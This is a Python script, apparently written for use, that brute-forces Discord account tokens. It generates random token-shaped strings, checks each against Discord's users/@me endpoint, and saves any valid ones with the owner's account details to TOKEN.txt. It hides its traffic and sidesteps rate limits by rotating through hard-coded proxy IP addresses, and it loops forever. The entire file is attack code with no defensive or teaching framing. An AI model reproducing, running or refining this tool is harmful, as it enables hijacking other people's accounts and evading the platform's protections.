import requests
import random , string
import time
import os
import random
import asyncio
from requests.exceptions import Timeout
from timeout_decorator import timeout, TimeoutError
import timeout_decorator
import subprocess
ip = {
    "ip": 10
    }
port = {
    "port": 10
    }








def tyu():
    time.sleep(1)
    os.environ['http_proxy'] = 'http://58.18.223.212:9002/'
    os.environ['https_proxy'] = 'http://104.223.135.178:10000/'

    try:
        i = 0
        while 100 > i :
            tenpl =  ''.join(random.choices(string.ascii_letters + string.digits , k=23)) 
            tenpls =  ''.join(random.choices(string.ascii_letters + string.digits+ "-" + "_", k=5)) 
            tenplt =  ''.join(random.choices(string.ascii_letters + string.digits + "-" + "_", k= 38)) 
            TOKENdiscord = f"MTA{tenpl}.G{tenpls}.{tenplt}"
            token = f"{TOKENdiscord}"
            print(token)




            mainheaders = {"Authorization": token, "Content-Type": "application/json"}

            res = requests.get("https://discordapp.com/api/v9/users/@me", headers=mainheaders)


            if res.status_code == 200:  # code 200 if valid
                # user info
                res_json = res.json()
                user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                user_id = res_json["id"]
                flags = res_json["flags"]
                public_flags = res_json["public_flags"]
                print(res_json)
                print(
                    f"UserName {user_name}\nUser Id {user_id}\nFlags {flags}\nPublic Flags {public_flags}\n"
                )
                f = open('TOKEN.txt', 'a')
                f.write(f'{token}\n')
                f.close()
            elif res.status_code == 429:
                print("RateLimited!!")
            else:
                print("Something wrong!! {}".format(res.status_code))
            i = i + 1

            if i == 20 :

                i = 0

                l = [1,2,3,4,5,6,7,8,9]
                rks = random.choice(l)
                
                print(rks)


                def ten():

                    match rks:
                        case 1: 
                            os.environ['https_proxy'] = 'http://192.240.106.146:3128/'
                        case 2: 
                            os.environ['https_proxy'] = 'http://91.207.173.99:443/'
                        case 3: 
                            os.environ['https_proxy'] = 'http://102.165.51.172:3128/'
                        case 4: 
                            os.environ['https_proxy'] = 'http://51.158.154.173:3128/'
                        case 5: 
                            os.environ['https_proxy'] = 'http://192.240.106.146:3128/'
                        case 6: 
                            os.environ['https_proxy'] = 'http://192.240.106.146:3128/'
                        case 7: 
                            os.environ['https_proxy'] = 'http://20.111.54.16:80/'
                        case 8: 
                            os.environ['https_proxy'] = 'http://192.240.106.146:3128/'
                        case 9: 
                            os.environ['https_proxy'] = 'http://192.240.106.146:3128/'


                @timeout_decorator.timeout(3)
                def test():
                    ten()

                if __name__=='__main__':
                    try:
                        test()
                    except Exception as e:
                        print("time out")
                    else:
                        print("test time yes")
                    
    except Exception as e:
        tyu()

while True:
    tyu()
    
